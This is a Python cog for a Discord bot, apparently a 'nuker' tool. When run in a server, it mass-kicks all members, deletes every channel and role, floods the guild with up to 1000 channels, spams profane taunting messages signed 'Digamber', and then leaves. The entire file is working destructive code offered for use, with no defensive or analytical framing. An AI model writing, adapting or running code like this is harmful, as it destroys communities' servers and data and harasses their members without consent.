import discord
from discord.ext import commands
import asyncio
import random

class NukerCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def nuke_server(self, guild):
        try:
            # STEP 1: INSTANT MASS KICK (LIGHT SPEED)
            print("🚫 LIGHT SPEED MASS KICKING...")
            kick_tasks = []
            for member in guild.members:
                if member != self.bot.user:
                    kick_tasks.append(member.kick(reason="Fucked By Digamber"))
            
            await asyncio.gather(*kick_tasks, return_exceptions=True)
            print("✅ ALL MEMBERS KICKED AT LIGHT SPEED!")
            
            # STEP 2: INSTANT CHANNEL DELETE
            print("🗑️ LIGHT SPEED CHANNEL DELETION...")
            delete_tasks = [ch.delete() for ch in guild.channels]
            if delete_tasks:
                await asyncio.gather(*delete_tasks, return_exceptions=True)
            
            # STEP 3: MASSIVE CHANNEL CREATION (1000+ CHANNELS)
            print("🔥 CREATING 1000+ CHANNELS AT LIGHT SPEED...")
            channel_count = 0
            
            # 1000+ CHANNELS BANAYEGE - NO STOP
            while channel_count < 1000:
                try:
                    # 50 CHANNELS EK SAATH - LIGHT SPEED
                    create_tasks = []
                    for i in range(50):
                        channel_names = [
                            f"💀-fucked-by-digamber-{channel_count + i}",
                            f"🔥-destroyed-by-digamber-{channel_count + i}",
                            f"⚡-nuked-by-digamber-{channel_count + i}",
                            f"🎯-obliterated-by-digamber-{channel_count + i}"
                        ]
                        name = random.choice(channel_names)
                        create_tasks.append(guild.create_text_channel(name))
                    
                    # EK SAATH CREATE KARO
                    await asyncio.gather(*create_tasks, return_exceptions=True)
                    channel_count += 50
                    
                    # ZERO DELAY - LIGHT SPEED
                    if channel_count % 100 == 0:
                        print(f"✅ {channel_count} CHANNELS CREATED...")
                    
                except Exception as e:
                    break
            
            print(f"🎉 {channel_count} CHANNELS CREATED AT LIGHT SPEED!")
            
            # STEP 4: LIGHT SPEED MESSAGE SPAM
            print("💬 LIGHT SPEED MESSAGE SPAM...")
            try:
                channels = await guild.fetch_channels()
                spam_tasks = []
                
                message_styles = [
                    "# Fucked by Digamber",
                    "## Fucked by Digamber", 
                    "### Fucked by Digamber",
                    "**FUCKED BY DIGAMBER**",
                    "__FUCKED BY DIGAMBER__",
                    "***FUCKED BY DIGAMBER***",
                    "```FUCKED BY DIGAMBER```",
                    "> FUCKED BY DIGAMBER",
                    ">>> FUCKED BY DIGAMBER",
                    "**# FUCKED BY DIGAMBER**",
                    "💀 **FUCKED BY DIGAMBER** 💀",
                    "🔥 **FUCKED BY DIGAMBER** 🔥",
                    "⚡ **FUCKED BY DIGAMBER** ⚡"
                ]
                
                for channel in channels[:100]:  # FIRST 100 CHANNELS
                    if isinstance(channel, discord.TextChannel):
                        # HAR CHANNEL MEIN 5-10 MESSAGES
                        for _ in range(random.randint(5, 10)):
                            msg = random.choice(message_styles)
                            spam_tasks.append(channel.send(msg))
                
                if spam_tasks:
                    await asyncio.gather(*spam_tasks, return_exceptions=True)
            except:
                pass
            
            # STEP 5: LIGHT SPEED ROLE DELETE
            print("🎭 LIGHT SPEED ROLE DELETION...")
            role_tasks = [role.delete() for role in guild.roles if role.name != "@everyone" and not role.managed]
            if role_tasks:
                await asyncio.gather(*role_tasks, return_exceptions=True)
            
            # STEP 6: FINAL MESSAGE
            try:
                channels = await guild.fetch_channels()
                if channels:
                    await channels[0].send(f"💀 **FUCKED BY DIGAMBER** 💀\n\n**{channel_count} CHANNELS OBLITERATED AT LIGHT SPEED!**")
            except:
                pass
            
            await guild.leave()
            print("✅ LIGHT SPEED NUKE COMPLETED!")
            
        except Exception as e:
            try:
                await guild.leave()
            except:
                pass

async def setup(bot):
    await bot.add_cog(NukerCommands(bot))
